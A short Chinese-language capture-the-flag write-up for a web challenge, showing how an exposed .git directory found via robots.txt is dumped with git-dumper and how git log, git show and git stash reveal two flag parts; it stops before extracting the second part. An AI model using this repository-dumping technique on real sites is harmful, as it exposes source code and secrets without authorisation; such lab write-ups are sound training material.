# Robots.txt Leak

**分类**: Web | Git 泄露

**难度**: ⭐⭐

**Author**: st4rry

> 机器人不小心泄露了一些敏感信息，你能找到其中的秘密（flag）吗？

> flag 格式为`HUBUMARS{flag}`

## 知识点

Robots 协议， Git 泄露
Git Log、 Git Stash

## WriteUp

访问 robots.txt 得知有目录.git

```bash
git-dumper url dir
```

访问`dir`目录

```bash
git log
重点关注
commit 5d03e0c5589416a958392ad483f7df7a2c506382
Author: k-0-i <jzcheng3@gmail.com>
Date:   Mon Oct 28 03:05:51 2024 +0000

    Add flag part 1
```

然后 查看

```bash
└─# git show 5d03e0c5589416a958392ad483f7df7a2c506382
commit 5d03e0c5589416a958392ad483f7df7a2c506382
Author: k-0-i <jzcheng3@gmail.com>
Date:   Mon Oct 28 03:05:51 2024 +0000

    Add flag part 1

diff --git a/flag1 b/flag1
new file mode 100644
index 0000000..373f1ad
--- /dev/null
+++ b/flag1
@@ -0,0 +1 @@
+part1: HUBUMAR{4a956bb8
```

git stash

```bash
git stash list
stash@{0}: On master: Test ^_^
stash@{1}: On master: Hide flag part 2
```

`stash@{1}`存在 flag

```bash
└─# git stash pop --index 1
On branch master
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        new file:   .flag.exe
        new file:   flag.txt

Dropped refs/stash@{1} (6a9f6961edcd9cb7727393b3aa9160b97ce13cf7)
```

第二部分 flag 在 .flag.exe 中
